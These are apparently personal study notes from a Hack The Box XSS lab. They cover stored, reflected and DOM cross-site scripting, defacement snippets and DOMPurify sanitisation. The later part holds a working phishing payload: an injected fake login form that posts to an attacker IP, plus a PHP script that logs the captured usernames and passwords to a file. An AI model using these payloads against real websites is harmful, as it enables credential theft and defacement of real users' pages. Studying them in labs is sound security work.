
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#vulnerability-details
* https://github.com/payloadbox/xss-payload-list
* Payload
    * <script>alert(document.cookie)</script>
    * <script>print()</script>
# <span style=color:#44D62C>Stored <font size=2, color=gray> Persistent XSS</font></span>
* stored in the back-end -> persistent
# <span style=color:#44D62C>Reflected <font size=2, color=gray> Non-Persistent XSS</font></span>
* not persistent through page refreshes
## <span style=color:#53565A>defacing vs. phishing</span>
```javascript
//Background Color
<script>document.body.style.background = "#141d2b"</script>
```
```javascript
//Background
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```
```javascript
//Page Title
<script>document.title = 'HackTheBox Academy'</script>
```
```javascript
//Page Text
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```
# <span style=color:#44D62C>DOM <font size=2, color=gray> Non-Persistent XSS</font></span>
```html
<img src="" onerror=alert(document.cookie)>
```
* onerror事件 -> 載入圖片時發生錯誤則執行 JavaScript
    * https://www.runoob.com/jsref/event-onerror.html
* DOMPurify 
    * https://github.com/cure53/DOMPurify#dompurify
---

---
### <span style=color:red>From-End</span>
#### Input validation
```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```
#### Input Sanitization
```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
}
```
### <span style=color:red>Back-End</span>
#### Input validation
``
For a NodeJS back-end, we can use the same JavaScript code mentioned earlier for the front-end.
``
#### Input Sanitization
```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```
---
* Phishing
```html
'> can close the src=""
```
```javascript!
//Login Form Injection
'><h3>Please login to continue</h3><form action=http://10.10.15.237:1234><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
```
## PHP Script to Sniffer
```javascript
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.2.255/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
### Cleaning
```javascript
document.getElementById('urlform').remove();
```

```test!
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.237:1234><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>;document.getElementById('urlform').remove();
)</script><!--
```